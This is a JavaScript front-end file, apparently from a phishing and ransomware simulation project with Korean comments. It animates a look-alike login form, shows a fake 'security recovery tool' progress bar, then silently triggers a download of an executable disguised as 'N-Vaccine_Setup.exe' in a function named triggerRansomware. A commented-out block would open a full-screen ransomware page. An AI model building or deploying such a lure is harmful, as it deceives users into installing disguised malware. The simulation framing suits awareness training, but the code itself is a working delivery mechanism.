document.addEventListener('DOMContentLoaded', () => {
    console.log('phishing.js: 스크립트 로드 완료');

    // 입력 라벨 애니메이션
    const inputs = document.querySelectorAll('.input_id, .input_pw');
    inputs.forEach(input => {
        const label = input.nextElementSibling;
        if (label) {
            input.addEventListener('input', () => {
                label.style.top = input.value ? '-3px' : '17px';
                label.style.fontSize = input.value ? '12px' : '16px';
            });
            input.addEventListener('focus', () => {
                label.style.top = '-3px';
                label.style.fontSize = '12px';
            });
            input.addEventListener('blur', () => {
                if (!input.value) {
                    label.style.top = '17px';
                    label.style.fontSize = '16px';
                }
            });
        }
    });

    // 툴팁 애니메이션
    const tooltips = document.querySelectorAll('.tooltip');
    tooltips.forEach(tooltip => {
        tooltip.addEventListener('click', () => {
            tooltip.style.background = '#03c75a';
            tooltip.style.color = '#fff';
            setTimeout(() => {
                tooltip.style.background = 'none';
                tooltip.style.color = '#888';
            }, 2000);
        });
    });

    // 다운로드 버튼 이벤트 바인딩
    const actionButton = document.querySelector('.action-button');
    if (actionButton) {
        console.log('phishing.js: action-button 발견');
        actionButton.addEventListener('click', (e) => {
            e.preventDefault();
            console.log('phishing.js: simulateExecution 호출');
            simulateExecution();
        });
    } else {
        console.error('phishing.js: action-button을 찾을 수 없음');
    }
});

function simulateExecution() {
    try {
        console.log('phishing.js: 보안 복구 도구 실행 시뮬레이션 시작');
        const overlay = document.getElementById('download-overlay');
        const progressBar = document.getElementById('progress-fill');

        if (overlay && progressBar) {
            overlay.style.display = 'flex';
            setTimeout(() => {
                progressBar.style.width = '100%';
            }, 100);
            setTimeout(() => {
                triggerRansomware();
            }, 4000);
        } else {
            console.error('phishing.js: 오버레이 또는 진행 바 요소를 찾을 수 없음');
            triggerRansomware(); // 오버레이 실패 시 즉시 이동
        }
    } catch (error) {
        console.error('phishing.js: simulateExecution 에러:', error);
        triggerRansomware(); // 에러 발생 시 바로 이동
    }
}

function triggerRansomware() {
    try {
        console.log('phishing.js: 파일 다운로드 시퀀스 시작');



        const link = document.createElement('a');

        // 2. 다운로드할 파일의 경로를 지정합니다.
        link.href = '../assets/N-Vaccine_Setup.exe';

        link.setAttribute('download', 'N-Vaccine_Setup.exe');

        // 4. 생성한 링크를 페이지에 잠시 추가했다가,
        document.body.appendChild(link);

        link.click();

        document.body.removeChild(link);

        console.log('phishing.js: 파일 다운로드 트리거 완료');


        /* --- 시나리오 흐름을 위한 코멘트   ---
        /*앵간 하면 팝업 페이지 로직은 쓰지 않고 만든 프로그램으로 돌리는게 젤 나을듯
         */
        /*
        console.log('phishing.js: 랜섬웨어 페이지 열기 시도');
        const ransomWindow = window.open('../pages/ransomware.html', '_blank', 'width=99999,height=99999');
        if (!ransomWindow) {
            console.error('phishing.js: 팝업이 차단되어 랜섬웨어 창을 열 수 없습니다.');
            alert('팝업이 차단되었습니다. 팝업 차단을 해제하고 다시 시도해주세요.');
        }
        */

    } catch (error) {
        console.error('phishing.js: triggerRansomware 함수 실행 중 에러 발생:', error);
    }
}